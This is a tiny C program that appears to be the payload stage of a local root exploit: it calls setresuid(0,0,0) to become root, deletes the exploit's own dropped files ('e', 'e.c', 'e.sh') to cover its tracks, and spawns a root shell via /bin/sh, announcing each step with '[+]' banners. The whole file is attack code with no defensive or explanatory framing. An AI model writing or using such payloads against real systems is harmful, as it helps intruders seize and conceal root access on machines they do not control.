#include <stdio.h>
#include <stdlib.h>
int main(int argc, char **argv){
    printf("[+] Getting root..!\n");
    setresuid(0,0,0);
    printf("[+] Cleaning system.\n");
    remove("e"); remove("e.c"); remove("e.sh");
    printf("[+] Launching root shell!\n");
    system("/bin/sh");
    exit(0);
}
